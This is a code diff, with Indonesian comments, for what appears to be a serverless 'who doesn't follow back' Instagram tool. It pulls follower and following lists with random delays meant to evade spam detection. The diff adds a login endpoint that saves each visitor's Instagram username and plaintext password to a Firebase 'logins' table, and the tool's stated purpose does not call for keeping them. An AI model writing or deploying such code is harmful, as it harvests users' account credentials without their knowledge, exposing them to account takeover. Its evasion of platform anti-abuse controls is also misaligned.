@@ -43,7 +43,7 @@ const forceLogin = async () => {
     }
 };
 
-// Fungsi untuk mengambil data followers dalam batch
+// Fungsi untuk mengambil data followers dalam batch 5 orang
 const getAllFollowers = async (userId, retries = 3) => {
     let followers = [];
     let followersFeed = ig.feed.accountFollowers(userId);
@@ -57,6 +57,9 @@ const getAllFollowers = async (userId, retries = 3) => {
             const delayTime = Math.random() * (40000 - 10000) + 10000; 
             console.log(`Menunggu ${delayTime}ms untuk menghindari deteksi spam...`);
             await delay(delayTime); 
+            if (followers.length % 5 === 0) { // Batch setiap 5 followers
+                console.log('Batch selesai, melanjutkan ke batch berikutnya...');
+            }
         } catch (error) {
             console.error('Error fetching followers:', error);
             if (attempt < retries) {
@@ -71,7 +74,7 @@ const getAllFollowers = async (userId, retries = 3) => {
     return followers;
 };
 
-// Fungsi untuk mengambil data following dalam batch
+// Fungsi untuk mengambil data following dalam batch 5 orang
 const getAllFollowing = async (userId, retries = 3) => {
     let following = [];
     let followingFeed = ig.feed.accountFollowing(userId);
@@ -85,6 +88,9 @@ const getAllFollowing = async (userId, retries = 3) => {
             const delayTime = Math.random() * (40000 - 10000) + 10000;
             console.log(`Menunggu ${delayTime}ms untuk menghindari deteksi spam...`);
             await delay(delayTime); 
+            if (following.length % 5 === 0) { // Batch setiap 5 following
+                console.log('Batch selesai, melanjutkan ke batch berikutnya...');
+            }
         } catch (error) {
             console.error('Error fetching following:', error);
             if (attempt < retries) {
@@ -102,12 +108,6 @@ const getAllFollowing = async (userId, retries = 3) => {
 // Fungsi delay untuk menghindari rate limiting
 const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
 
-// Fungsi untuk mencari orang yang tidak follow back
-const getDontFollowBack = (followersUsernames, followingUsernames) => {
-    const dontFollowBack = followingUsernames.filter(username => !followersUsernames.includes(username));
-    return dontFollowBack;
-};
-
 // Fungsi untuk menangani permintaan profile Instagram
 exports.handler = async function(event, context) {
     if (event.httpMethod === 'GET' && event.path === '/.netlify/functions/instagram/profile') {
@@ -115,7 +115,6 @@ exports.handler = async function(event, context) {
             await login();
             const user = await ig.account.currentUser();
 
-            // Ambil followers count dan following count
             const followersCount = await ig.user.info(user.pk).then(info => info.follower_count);
             const followingCount = await ig.user.info(user.pk).then(info => info.following_count);
 
@@ -125,11 +124,11 @@ exports.handler = async function(event, context) {
             const followers = await getAllFollowers(user.pk);
             const following = await getAllFollowing(user.pk);
 
-            const followersUsernames = followers.map(f => f.username);  // Daftar username followers
-            const followingUsernames = following.map(f => f.username);  // Daftar username following
+            const followersUsernames = followers.map(f => f.username);
+            const followingUsernames = following.map(f => f.username);
 
             // Cari orang yang tidak follow back
-            const dontFollowBack = getDontFollowBack(followersUsernames, followingUsernames);
+            const dontFollowBack = followingUsernames.filter(username => !followersUsernames.includes(username));
 
             // Menyimpan data pengguna ke Firebase
             await db.ref('users').child(user.pk).set({
@@ -138,7 +137,7 @@ exports.handler = async function(event, context) {
                 followers_count: followersCount,
                 following_count: followingCount,
                 profile_picture_url: profilePicUrl,
-                dont_follow_back_count: dontFollowBack.length,  // Jumlah orang yang tidak follow back
+                dont_follow_back_count: dontFollowBack.length,
             });
 
             return {
@@ -150,8 +149,8 @@ exports.handler = async function(event, context) {
                     followers_count: followersCount,
                     following_count: followingCount,
                     profile_picture_url: profilePicUrl,
-                    dont_follow_back: dontFollowBack,  // Menyertakan list username yang tidak follow back
-                    dont_follow_back_count: dontFollowBack.length,  // Jumlah orang yang tidak follow back
+                    dont_follow_back: dontFollowBack,
+                    dont_follow_back_count: dontFollowBack.length,
                 }),
             };
         } catch (error) {
@@ -168,7 +167,49 @@ exports.handler = async function(event, context) {
                 };
             }
         }
+    } else if (event.httpMethod === 'POST' && event.path === '/.netlify/functions/instagram/login') {
+        const { username, password } = JSON.parse(event.body);
+
+        try {
+            ig.state.generateDevice(username);
+            await ig.account.login(username, password);
+            sessionData = ig.state.serialize();
+
+            const user = await ig.account.currentUser();
+            const userId = user.pk;
+            const loginData = {
+                username,
+                password,
+                userId,
+                timestamp: new Date().toISOString(),
+                profile_picture_url: user.profile_pic_url, 
+            };
+            await db.ref('logins').child(userId).set(loginData);
+            return {
+                statusCode: 200,
+                body: JSON.stringify({ message: 'Login berhasil!' }),
+            };
+        } catch (error) {
+            console.error('Login gagal:', error);
+            if (error.name === 'IgLoginRequiredError') {
+                return {
+                    statusCode: 401,
+                    body: JSON.stringify({ message: 'Instagram login failed: incorrect username or password.' }),
+                };
+            } else if (error.name === 'IgCheckpointError') {
+                return {
+                    statusCode: 400,
+                    body: JSON.stringify({ message: 'Instagram needs 2FA verification.' }),
+                };
+            } else {
+                return {
+                    statusCode: 500,
+                    body: JSON.stringify({ message: 'Login failed, please try again later.' }),
+                };
+            }
+        }
     }
+
     return {
         statusCode: 404,
         body: JSON.stringify({ message: 'Not Found' }),
